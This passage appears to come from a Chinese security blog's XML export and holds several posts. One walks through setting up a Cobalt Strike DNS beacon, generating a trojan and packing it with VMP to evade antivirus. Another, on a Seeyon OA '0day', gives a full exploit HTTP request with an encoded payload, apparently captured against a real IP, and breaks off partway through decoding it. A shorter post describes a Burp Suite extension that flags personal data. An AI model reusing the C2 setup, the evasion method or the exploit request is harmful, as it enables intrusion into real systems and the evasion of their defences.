<p><a href="https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/sd73eL3-TnMm0zWLCC8cOQ</a></p>
<p><a href="https://docs.python.org/zh-cn/dev/library/pickle.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/dev/library/pickle.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/148696337" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/148696337</a></p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Cobaltstrike Beacon DNS上线</title>
    <url>/2020/12/02/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>因为最近捣鼓了一下Cobaltstrike DNS上线，发现网上文章大多数千篇一律(复制粘贴)，形成很多误导。</p>
<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">域名平台：阿里云</span><br><span class="line">CobaltStrike版本：<span class="number">4.1</span></span><br></pre></td></tr></table></figure>

<h4 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h4><h5 id="域名配置"><a href="#域名配置" class="headerlink" title="域名配置"></a>域名配置</h5><a id="more"></a>

<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">添加一条<span class="keyword">A</span>记录指向服务端地址，然后添加两条（可一条）<span class="keyword">NS</span>记录指向<span class="keyword">A</span>记录</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201125358965.png" alt="image-20201201125358965"></p>
<h5 id="Listener-配置"><a href="#Listener-配置" class="headerlink" title="Listener 配置"></a>Listener 配置</h5><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">Name: 自定义</span><br><span class="line">Payload: Beacon DNS</span><br><span class="line">DNS Hosts: 域名的NS记录(一个以上)</span><br><span class="line">DNS Hosts(Stager):<span class="built_in"> DNS </span>Hosts的中的一个（只有一个的情况就写一样的）</span><br><span class="line">DNS Port(Bind): 空</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201144725118.png" alt="image-20201201144725118"></p>
<h5 id="环境检测"><a href="#环境检测" class="headerlink" title="环境检测"></a>环境检测</h5><figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">nslookup ns记录</span><br><span class="line">默认情况下看是否返回<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>，返回则表示成功。（可通过profile来更改的，其进行流量隐藏等，具体可见参考）</span><br></pre></td></tr></table></figure>

<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201130948405.png" alt="image-20201201130948405"></p>
<h4 id="生成木马"><a href="#生成木马" class="headerlink" title="生成木马"></a>生成木马</h4><p>这里生成一种进行演示，可自行尝试其他方式。</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201132840569.png" alt="image-20201201132840569"></p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133135684.png" alt="image-20201201133135684"></p>
<h4 id="上线"><a href="#上线" class="headerlink" title="上线"></a>上线</h4><p>目标靶机执行生成的木马文件</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133647578.png" alt="image-20201201133647578"></p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line">出现小黑电脑右键-&gt;Interact</span><br><span class="line">输入命令</span><br><span class="line">checkin #强制回连</span><br><span class="line">注：很多文章需输入mode dns-txt （默认就为dns-txt模式）</span><br><span class="line">根据官方文档描述，CS4中有三种数据传输模式，<span class="keyword">A</span>、<span class="keyword">AAAA</span>、<span class="keyword">TXT</span>，默认是<span class="keyword">TXT</span></span><br></pre></td></tr></table></figure>

<p>显示蓝色电脑如图则成功上线</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201133927679.png" alt="image-20201201133927679"></p>
<p>执行whoami</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201135019135.png" alt="image-20201201135019135"></p>
<h4 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h4><p>这里演示一下加壳免杀过某绒。</p>
<p>免杀前，生成的文件直接给某绒自动处理了。</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201143243313.png" alt="image-20201201143243313"></p>
<p>进行VMP加壳处理</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201143432147.png" alt="image-20201201143432147"></p>
<p>进行检测</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201144944327.png" alt="image-20201201144944327"></p>
<p>测试</p>
<p><img src="/img/Cobaltstrike-Beacon-DNS%E4%B8%8A%E7%BA%BF/image-20201201154931556.png" alt="image-20201201154931556"></p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a href="https://xz.aliyun.com/t/7938" target="_blank" rel="noopener">https://xz.aliyun.com/t/7938</a></p>
<p><a href="https://www.nctry.com/1655.html" target="_blank" rel="noopener">https://www.nctry.com/1655.html</a></p>
<p><a href="https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/" target="_blank" rel="noopener">https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</a></p>
]]></content>
      <tags>
        <tag>Cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title>某SRC任意文件包含漏洞 包含日志Getshell</title>
    <url>/2020/10/20/%E6%9F%90SRC%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E-%E5%8C%85%E5%90%AB%E6%97%A5%E5%BF%97Getshell/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="密码不正确，请重新输入！" data-whm="文章不能被校验, 不过您还是能看看解密后的内容！">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="" />
    <label for="hbePass">该文章已加密, 请输入密码查看。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="c81eda7ff55877f1cad0bf7df46f730520ee4ac93067774dc51d8bdc27d071be"></script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <tags>
        <tag>ThinkCMF</tag>
      </tags>
  </entry>
  <entry>
    <title>BurpSuite-Extender-Unexpected information</title>
    <url>/2020/09/28/Unexpected_information_BurpSuite_Extensions/</url>
    <content><![CDATA[<p>最近写了一个BurpSuite Extensions用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，我将它命名为“Unexpected information”，使用它可能会有意外的收获信息。</p>
<a id="more"></a>

<h4 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h4><h5 id="支持列表"><a href="#支持列表" class="headerlink" title="支持列表"></a>支持列表</h5><ul>
<li><input checked="" disabled="" type="checkbox"> 身份证信息</li>
<li><input checked="" disabled="" type="checkbox"> 手机号信息</li>
<li><input checked="" disabled="" type="checkbox"> IP信息</li>
<li><input checked="" disabled="" type="checkbox"> 邮箱信息</li>
<li><input checked="" disabled="" type="checkbox"> JS文件API接口路径</li>
<li><input checked="" disabled="" type="checkbox"> 特殊字段(password、method: “post”…)</li>
<li><input checked="" disabled="" type="checkbox"> 双向检测</li>
<li><input checked="" disabled="" type="checkbox"> 高亮显示</li>
</ul>
<h5 id="高亮模式"><a href="#高亮模式" class="headerlink" title="高亮模式"></a>高亮模式</h5><figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">邮箱 -&gt; 黄色</span><br><span class="line">内网IP -&gt; 红色</span><br><span class="line">手机号码 -&gt; 绿色</span><br><span class="line">身份证号码 -&gt; 绿色</span><br><span class="line">其他 -&gt; 无 (只开启Unexpected information标签页)</span><br></pre></td></tr></table></figure>

<p>当如数据包中存在有相关的对应信息(如手机号码、IP地址、邮箱、身份证号码等)存在时HTTP history标签页中的对应请求中自动标记颜色高亮，并且开启一个新的标签页名为”Unexpected information”显示匹配到的信息。</p>
<h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><figure class="highlight mipsasm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">BurpSuite </span>&gt;&gt; <span class="keyword">Extender </span>&gt;&gt; <span class="keyword">Extensions </span>&gt;&gt; <span class="keyword">Add </span>&gt;&gt; <span class="keyword">Extension </span>type: <span class="keyword">Java </span>&gt;&gt; Select file ...&gt;&gt; 选择对应的插件(Unexpected information.<span class="keyword">jar)</span></span><br><span class="line"><span class="keyword">注意：避免使用中文目录</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913144353237.png" alt="image-20200913144353237"></p>
<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913151710096.png" alt="image-20200913151710096"></p>
<p><img src="https://raw.githubusercontent.com/ScriptKid-Beta/Unexpected_information/master/image-20200913152201413.png" alt="image-20200913152201413"></p>
<h4 id="项目地址"><a href="#项目地址" class="headerlink" title="项目地址"></a>项目地址</h4><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>Unexpected_information</span><br><span class="line"></span><br><span class="line"><span class="regexp">//</span> jar文件</span><br><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/ScriptKid-Beta/</span>Unexpected_information<span class="regexp">/releases</span></span><br></pre></td></tr></table></figure>

<h4 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h4><p>欢迎师傅Star，最重要的是如果师傅们有什么建议或者Bug，请在issues里提出来或者公众号留言。</p>
]]></content>
      <tags>
        <tag>JAVA</tag>
      </tags>
  </entry>
  <entry>
    <title>致远OA_0day(捕捉)</title>
    <url>/2020/09/28/%E8%87%B4%E8%BF%9COA_0day(%E6%8D%95%E6%8D%89)/</url>
    <content><![CDATA[<p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
<div style="text-align: right"> 小维</div>

<h4 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h4><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="keyword">http</span> <span class="keyword">contains</span> <span class="string">"..;/"</span></span><br><span class="line"><span class="keyword">http</span>.request.uri == <span class="string">"/seeyon/SeeyonUpdate1.jspx"</span></span><br></pre></td></tr></table></figure>

<a id="more"></a>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&amp;managerName=formulaManager&amp;requestCompress=gzip</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: </span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">User-Agent</span>: Opera/9.80 (Macintosh; Intel Mac OS X 10.6.8; U; fr) Presto/2.9.168 Version/11.52</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span>: none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span>: navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span>: ?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span>: document</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span>: JSESSIONID=7B6D8C106BD599DB0EF2F2E3B794A4FA; loginPageURL=; login_locale=zh_CN;</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 8819</span><br><span class="line"></span><br><span class="line">managerMethod=validate&amp;arguments=%1F%C2%8B%08%00%00%00%00%00%00%00uTK%C2%93%C2%A2H%10%3E%C3%AF%C3%BE%0A%C3%82%C2%8Bv%C3%B4%C2%8C%C2%8D+c%C2%BB%13%7Bh_%C2%88%28*%28%C2%AF%C2%8D%3D%40%15Ba%15%C2%B0%C3%B2%10%C3%AC%C2%98%C3%BF%C2%BE%05%C3%98%C3%93%3D%C2%B1%C2%BDu%C2%A9%C3%8C%C2%AC%C3%8C%C2%AF%C3%B2%C3%BD%C3%97k%C3%B7%14_H%C2%8E%C2%9DC%C2%95x%C3%9D%3F%C2%98%C3%81%17%C3%A6M%C2%A28%C2%A4%C2%96t3%2F%C3%8D%C2%BA%C3%AF%C3%A2y%C2%99%5C%C2%BC4EqT%3Fj%C3%99%05E%3E%C2%938Y%C3%80%C3%BC%C3%89t%C3%BA%C3%BD%C2%A7%C2%AB%C3%A7%3AI%C2%92%3E%C2%A5%C2%9EW%C3%85%C3%91S%C3%A7%C3%BB%C3%AFL%7B%7E%0B%C2%9D%C3%82%C3%A9%C2%A3%C2%B8%C2%BF%C2%A3%26%C2%99qA%C2%99wa%C2%92w%C2%9A%C2%A3%00%C2%91we%3EQ%C3%AB%C3%95%C3%B8%C2%8F%1D%C2%AD%C2%81%3C%26%C3%90%C3%89%C2%BCA%3FL%C2%93%C2%B2%C3%B3%C3%B0%13%C2%9E%C2%B9%C2%BB%C2%92%06%1E%C3%86%C2%B5%2F%3B1%C2%B9%C2%81YR%C2%B9%C3%9C%C2%98%C2%95%C2%96A%C3%A6%C2%8A%C3%82mKj%19%C2%8B%C2%9C%C2%A5%C3%8A%C2%82Y%5C%C2%AC%C2%B9%24%C2%80d%C2%9E%03%5E%C3%8F%C3%97D%29%5Cm%2C%1F%07%2F%C3%85Q%5CD%C2%B6%26%C3%B9%C2%90%C3%A8%15%C3%A0p%C3%A1%C2%86%2C%C3%9Ah%C3%83J%0A%C2%87%C3%8FN%C2%A4%5C%C2%B7DM%00%C3%91C%28b%C3%8E%C3%96%C2%84%C2%ABe%40%2C%C2%898%03%C3%A2%C2%B8%C2%825%3EYp%C2%96%26%0C%C3%A8%7B%C2%BAFq%C3%9A%C3%B0%C2%A6%C2%9F%5B%C3%BCJ%00K%C2%B5%C3%B8TFqmc%C2%93%C3%8BH*va%C3%B9%0F%C3%A0_%C2%BE%C3%99%C2%A2%1E%C2%BA%C3%A2%C2%A2%C2%B2L5q%C2%B9%C3%A1%C2%A3%24*%C2%A9e*7iq%C3%B4m3%60mC8%C2%83j2%C2%A3%3A7%C3%80%C2%96%C2%85e%C2%A8%18D%C2%99.%C3%8F%5B%C2%BD%C2%838%0E%28F%25%C2%89%C2%9B%C3%84%C3%A3%C2%95%01%C2%A0%C2%B4L%C3%A9-%3F%C2%B8Bc%C2%95%3A%C3%86%C3%86%C3%9Fse%00%C3%B8%C2%8DoW%01%C3%B2L%15K%C2%8B%0CZ%08%C2%8Fh%7C%2C4W%C2%B9%C2%B4l%C3%AD%C3%96D%C3%856%C3%81%C2%B9%7Dl%C2%B1eQJ7%C3%93%12%C2%ADI%C2%89%5D%02Ygz%1E%C2%9DL%C3%B6%C2%99%C3%A6%C2%B4%C3%8E%C3%BB%C3%996j%C2%BDU%40s%40%C3%B3w%C3%8F%5B%C2%A4%C2%84%C2%80%C3%A0%2B%14K%0Cg%C3%82%01.W%C2%89K%C2%80%C3%AF%C3%9CXd%1F%C3%B6%03%C3%BB%C2%B0%C2%A9%C2%B6%C2%86%C2%8D%C2%ADP%3Fo%0F%C3%92%C3%80B%C3%92%08p%C3%BA%C2%AD%C2%A9%01%12%C2%AE%C3%90T%0D%C3%8B%28%07%C2%B6%C3%A6%23%C2%A8I%C2%A9S%C2%9DG%7B%0E_%C2%9D6%C3%86%C3%B1%1B%C2%BD%26%10%C3%839%C2%A6uU%03%C2%97%28X%C2%9E%C2%AE%26%C2%AA%C2%BEA%C3%B2%21%0B%C3%974%06%C3%87%C3%9C%C3%87%1BT%C3%A6%C2%B6%09%C3%BC%23%C2%A7%C2%87u%C2%AC%1A%C2%A7%0BG%7E%C2%82%C2%AD%C3%8A%C2%8F%3F%C3%BC%19%C3%99%C2%BF%C3%BE%C2%99%C3%88%C2%95%C2%84d%C2%AD%C2%91O%C3%AB%7C%C2%81%C3%8AO%C3%96o%C3%B8%C3%9Ay%C3%A4%12%C2%9D%C2%A7%C3%B5%C2%89%C2%A1%18%24%C2%A0j%C3%B4%C3%9A%C3%BA%C3%94z%C2%8D_%C2%BF%C3%96F%C2%9E%C2%9E%C2%A9%1C%C3%84V%25%C2%9C%5D%C3%96%C2%A6%C3%B9X%C2%A4%C2%B2%28%60XMn%C3%90%18%C3%A6%C2%AE%C2%81o%C3%B4m%C2%BA%C3%97%C2%95%C2%85%12%C2%AAs%C2%9A%C3%97%C3%A2n%C2%977%C3%BD%C3%81%C2%A9x%1F%C3%A9%C3%84%C2%A6%C2%BD*%2FW%18%C2%98%3A%06%C3%BC%3E%C2%B79%C2%9D%3D%12%C3%BD%C3%AD%C2%8F%1C%C3%944%C2%9D%5E%C2%97%1Cc%C3%AAgBc%C2%A0%C3%B1%C3%83%C2%95%1B%29%C2%ACe%08%21%C2%8D%C2%8F%C3%BA%C2%A1%C2%97%C3%90X%C2%A4%C2%A0%0A%C2%9A%C2%9E%C3%9Es%C3%A3%1C%C2%8A%C3%BA%10%C3%92%C3%9A%C3%AE%C2%A6%C3%A3%C2%A6%27%01%C2%A7T%C2%8E9a%5DQgw%C3%A1%C2%B5h%C3%AB%C2%BA*%5C%7E%C3%BF%C3%B8%3E%C3%ADL%C2%9AG%7D%C2%82R%C3%90%C2%9F%C2%BCh%C3%B3o%C3%83%C2%99%07bH%07%1E%C3%9E%C3%AFv%C3%96%3FW%C3%AA%C3%BDw%C2%AA%5B%C2%B3%3B%C3%93%C3%9A%C2%B6L%C3%AF%0E%C3%98o%C3%AFI%7E%3AQ%C2%80f%09%3C%7C%C3%A9%1C%0F%C2%8B%C2%AF%C3%8F%1F%C2%97%C3%84%C3%87%7D%C3%93o%18%1C%C3%B5%3E%C2%82%C3%BF%C2%9F.%C3%80q%C3%AAQ%C3%87%7E%7C%C2%AF%C3%B7%21%25%C2%A0wb%C3%92%C3%8C%C3%89%10%60%C3%8A%C2%B2%C3%AC%3D%C2%BCv%7F%C3%90%25I%17%C3%A5k%7Dg%C2%97%C3%9C%C3%AB%C3%BE%C3%BD%2FheA%C3%A4_%05%00%00</span><br></pre></td></tr></table></figure>

<figure class="highlight"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 <span class="number">500</span> </span><br><span class="line"><span class="attribute">Pragma</span>: No-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"><span class="attribute">Expires</span>: Thu, 01 Jan 1970 00:00:00 GMT</span><br><span class="line"><span class="attribute">Content-Type</span>: application/json;charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span>: 51</span><br><span class="line"><span class="attribute">Date</span>: Wed, 16 Sep 2020 08:56:43 GMT</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Server</span>: SY8045</span><br><span class="line"><span class="attribute">Set-Cookie</span>: BIGipServer~CMEW-PRD-DMZ~pool_cmew-pms-lb_http80_CMEW-PRD-DMZ_prd=rd62o00000000000000000000ffff644e0303o80; path=/; Httponly</span><br><span class="line"></span><br><span class="line">&#123;"message":null,"code":"0246603709","details":null&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">GET</span> <span class="string">/seeyon/SeeyonUpdate1.jspx</span> <span class="string">HTTP/1.1</span></span><br><span class="line"><span class="attr">Host:</span> <span class="number">202.105</span><span class="number">.134</span><span class="number">.19</span></span><br><span class="line"><span class="attr">User-Agent:</span> <span class="string">Mozilla/5.0</span> <span class="string">(Macintosh;</span> <span class="string">Intel</span> <span class="string">Mac</span> <span class="string">OS</span> <span class="string">X</span> <span class="number">10.15</span><span class="string">;</span> <span class="string">rv:80.0)</span> <span class="string">Gecko/20100101</span> <span class="string">Firefox/80.0</span></span><br><span class="line"><span class="attr">Accept:</span> <span class="string">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span></span><br><span class="line"><span class="attr">Accept-Language:</span> <span class="string">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="attr">Accept-Encoding:</span> <span class="string">gzip,</span> <span class="string">deflate</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Cookie:</span> <span class="string">JSESSIONID=1EE0AC538A01698F6B502A186FABFEA8;</span> <span class="string">BIGipServer~CMEW-PRD-DMZ~pool_cmew-pms-lb_http80_CMEW-PRD-DMZ_prd=rd62o00000000000000000000ffff644e0303o80;</span> <span class="string">loginPageURL=</span></span><br><span class="line"><span class="attr">Upgrade-Insecure-Requests:</span> <span class="number">1</span></span><br></pre></td></tr></table></figure>

<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">HTTP/1.1</span> <span class="number">200</span> </span><br><span class="line"><span class="attr">Content-Type:</span> <span class="string">text/html;charset=utf-8</span></span><br><span class="line"><span class="attr">Content-Length:</span> <span class="number">508</span></span><br><span class="line"><span class="attr">Date:</span> <span class="string">Wed,</span> <span class="number">16</span> <span class="string">Sep</span> <span class="number">2020</span> <span class="number">08</span><span class="string">:51:48</span> <span class="string">GMT</span></span><br><span class="line"><span class="attr">Connection:</span> <span class="string">close</span></span><br><span class="line"><span class="attr">Server:</span> <span class="string">SY8045</span></span><br></pre></td></tr></table></figure>



<h4 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&lt;?php $s = urldecode(<span class="string">"%1F%C2%8B%08%00%00%00%00%00%00%00%C2%B5X%5B%C2%93%C2%A2J%12%7E%C3%9E%C3%BD%15F%C2%BF%C3%B4L%C3%8Cl%0F%C2%A2%C3%8C%0C%7Bb%1ED%05%11%C2%A5%5B%C2%90%C3%AB%C3%86%3E%C3%88%C2%A5%01%29.%C3%93%C2%80%C2%8A%13%C3%A7%C2%BFo%16%17%C3%85%C3%96%C3%AE%C2%9D%C3%98%C3%98c%C2%84%21B%C2%91%C2%95%C2%95%C3%B9%7D_f%C3%95%C2%BF%7E%C3%9D%3F%27%2FQ%C2%816%C3%AB2u%C3%AF%C3%BF%C3%99%C3%AB%7F%C3%AE%C2%B5w%C3%84M%C2%84%C3%AF%C3%9C%C3%A7n%C2%96%C3%9F%C2%9FoO%0F%C3%A9%C2%8B%C2%9BeA%12%C3%A3%C2%87r%C3%BE%12%C3%84%5E%2F%C3%9D%C3%A4%7E%C3%AFG%C3%AF%C3%AE%C3%A1%C3%A1%C3%8B%C3%9E%C2%B56i%C2%9A%7D%C3%89%5C%C2%B7L%C3%A2%2Fw%7F%C3%BC%C2%BDW%7F%C3%BE%C2%B6%C3%9D%C3%AC6%0FA%C3%B2%C3%B0%04%C2%AF%C3%A4%C3%9AK%C2%90%C2%BB%2F%C2%BD%C3%B4%7CM%C2%82%C2%81%C3%98%C3%9D%C3%B7n%0C%C3%BB%C2%80%C3%AD%7F%C2%BA%C2%93%2B%C2%93J%C3%AAlr%C3%B7a%C2%9B%C2%A5%C2%87%C2%BB%C2%8F%27%C3%AB%C2%BD%C3%86%C2%93%C3%8Cw%11%C3%82%C2%AE%3Cq%C3%A9%C3%91%C2%9E%C2%A4%C2%A5E%C3%92%04%3F%C3%B3s%C2%8B%C2%A3%C2%8E%C2%8F%11%C2%BEG%04%C2%9B%C2%99D%C3%98%C2%93d%C2%B7+S%C3%9F%C2%89%C2%A6%C2%85%3DP%C2%8BE%24%C3%AE%2C%C2%99%16%C2%94%C3%BEh%C2%A7pll%C3%8A%C2%BC%C3%A7Dji%C2%93hgm%C2%89%60%29%0FK%7E%3B%C3%BC%C2%BE%C2%89%C3%85%C3%BDc%24%C2%A5v%C2%A4n%1D%0E%C2%91%C2%A6L%C3%AD%0D%C3%8DA%3C%C2%87r%C2%9B%C2%A3K%07%C3%9B%C2%8FX%C3%92%C2%90%C2%A9%3E%3C%C3%8F%16A%C2%92U%C3%BFu%C2%AF0%06s%C3%8A%C2%9EI%C2%BB%C2%9B%C3%B7%C3%80%C2%AE%C2%A9-%0B%21%C3%A0wO%C3%9B%C3%83O%7B0%C3%BAjr%C3%AA%C3%96%C3%A2%C3%98%C3%92%C3%90%C2%A5%C3%94%22%C2%87%C2%9F%C3%86%C2%AAH%C3%98%11*%C3%8C%C2%92%19%1A%C3%A5%C2%88%C3%A6%C3%87%3C%C2%B5%5C%C3%8F%C2%91q%C3%B4%C3%B6K%C2%92%2F%0DR%21%1E5%C2%85%C3%A0%C2%B7%C2%99%C3%87%C2%8FG%C2%9E2%C2%90%C3%8A%C2%8DF%C3%85%C3%BC%C2%8C%C3%B1%C3%AD%C3%81%C3%92%7B%C2%92G%C2%81%C2%A1%C2%8B%C2%A1%19%C3%A5%3FM%C3%9D%C3%B1M%C3%8E%08%1E%C3%8B%11%C2%8Ce%C3%96%C3%8El%C2%9EZ%C2%91%C3%ADY%C3%9A%C2%AA%C3%8FO%C2%88%C3%AAWh%C3%9E%13%C2%AA%C3%B9%C3%82o%C3%98%26%C3%8F%C2%89%19%C3%988%C3%B2%C2%AC%C3%A7%C2%99%C2%BAO%C2%98%1A%15%C3%9A%253%01%3F%C2%8F6q%C3%98%19%C2%9A%C2%84%C3%AC%C2%80%C2%A9%C3%87V_f%C3%AFh%C3%B3l%C2%A3-%3Dm%C3%AC%C2%BF%1E%C3%B7U%C2%90%C2%BBc%C3%AB%2F%C3%A4co%C3%AA%7C%C3%A2%06a%C3%97%0E%7D%C3%8B%C3%A6%C2%8A%3CT%3E*%C2%B2%1F%C2%B8%C2%BA%C2%84%C2%B4%3E%C3%A1%19%24%C2%9F%C3%B2%C2%B3%C3%8C%C2%BB%C2%B4%C3%8B%C2%94%C2%A6.%C3%B5%C3%ADh%C3%98%C3%9A%2F+%C2%BE%11%C3%84%0756%12x%2F%C3%A3%27%C2%A3%0C%C3%96%18%2C%C2%A2%03%C2%B2%22%C2%87%C3%98%C2%8Co%C3%B80%23j%3Fgj%60qh%C3%8Bss%C3%8A%C3%A1TK%C2%97%C2%99%C2%A1p%C2%BE%3E.%C3%86L%00%C3%B8%C3%8BL%C2%8D-x%C2%8E%C2%B8%C3%B4i%26%C2%95%C3%AE%C2%8D%C2%B5_%C3%A1%22%14S%C2%9B%C3%B3q%C2%AC%C2%B68%2Fo%3F%C2%A7bX%C3%9F%C3%9C%C2%8AE%C3%82%C3%90%C2%A8%C2%AD%29%7B%C3%81JQ%C3%97%C3%BCE%0C%C3%AB%C2%AFQR%C2%90kD%08%1C%C3%A1%3D%C2%95%C2%A3%03%3FI%C2%BCe%C2%B0%C3%B7%C2%ACH%1D%C3%B0%1C%C3%A6%04%3B%04%3E%C2%94%C2%AE%C3%8E%10VI%1Dm%C3%80%C3%A1%02%C2%89%08%C3%A6D%C3%8E4G%C2%AEZa5q%C2%B9ea%C2%92*%C2%B1%C2%8A%11a%C3%AA%C3%8BD%C2%90%C3%B7%1E%1F%C2%B2%C2%ACR%C3%B2%C2%A9%C2%B0%7E%3B%C3%BE0%7Fh%11%26%C3%B8%C3%80f%C3%82l%C2%99%C3%96%18%C2%AC%C2%BF%C3%8F2%C2%B3%05%C2%BCo7%C3%A3Q%22%C3%A9%C3%BE%C3%96%04%1F6%1A%0D%C3%B1S%C3%9E%C3%8D%C2%A9%15%C2%AB%C2%995%C3%A9%C3%86%C2%97h%C3%AC%5D%C3%A2%C3%85%1EH%C2%BE%C2%83s%C3%86%C2%9E%C2%B8%C2%94%C2%9B%13%259sey9%C3%8Fy%1C%C3%8C%C2%B5%02%0E1%C2%85%C2%A3%1D%C2%B2%C2%AE%C3%8F%C3%80%1D%C3%AA%C2%86o%3F%0D%C3%9D%C3%B4%C2%81%C3%97%107%C2%B5%C3%9C%C3%A8%12%C2%B5%08%C3%BB%C3%88%1E%C2%88%3E%C3%84l%C2%BA%01%C3%8D%C2%B0%07%2B%C3%8F%C2%BA%C2%8ES%7E%C3%8A%C2%B3L%1DMM%C2%84%C3%B5%21%C3%82%C2%95%29%C3%91%04%C3%9Ea%C2%AD%C2%918%04%C2%B9%16%C2%89E%C3%A4%40%3EP%C2%81%C3%97dE%22%12%C3%86sQ%C2%9A%28%C3%81%C2%8D%C3%98%C3%A7%C2%8B%180%C3%8F%C2%B1%C2%84%29%C3%BB%C3%87%C3%BA%C2%BD%0A%C2%A7Ga%1C%C3%96%C2%98%C2%9F-%0B%C2%8BS%0Bs+%25p%C3%AF%22%27u%3C%21%C3